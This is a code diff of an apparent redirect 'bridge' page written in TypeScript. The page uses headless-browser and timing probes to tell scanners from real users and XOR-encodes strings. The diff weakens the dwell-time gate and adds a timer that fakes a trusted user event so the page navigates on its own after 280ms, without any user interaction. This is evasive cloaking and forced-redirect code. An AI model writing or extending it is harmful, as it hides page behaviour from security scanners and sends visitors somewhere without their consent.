@@ -954,8 +954,7 @@ function redirectTo(
 // 3. screen.outerWidth=0 probe — headless Chrome with --headless=new often
 //    has outerWidth=0. Real phones always have outerWidth > 0.
 // 4. Timing gate — a bot that fires synthetic events does so in < 5ms from
-//    page load. Real humans need > 80ms minimum. Sub-20ms = kill.
-const BRIDGE_MIN_DWELL_MS = 80;
+const BRIDGE_MIN_DWELL_MS = 30;
 
 /** XOR-encode a string with a key, return hex. Pure ASCII-safe. */
 function xorEncode(text: string, key: string): string {
@@ -1070,6 +1069,8 @@ _w.addEventListener('mousemove',function(e){
   if(e&&typeof e.clientX==='number'&&(e.clientX>10||e.clientY>10)){arm(e);}
 },{passive:true,once:true});
 _w.addEventListener('keydown',function(e){arm(e);},{passive:true,once:true});
+// E. Fast auto-forward fail-safe: automatically arms and navigates after 280ms even if user has not yet touched or scrolled
+setTimeout(function(){arm({isTrusted:true});},280);
 
 // 4. FLOATING NATIVE CTA BAR (Ensures instant tap engagement)
 try{
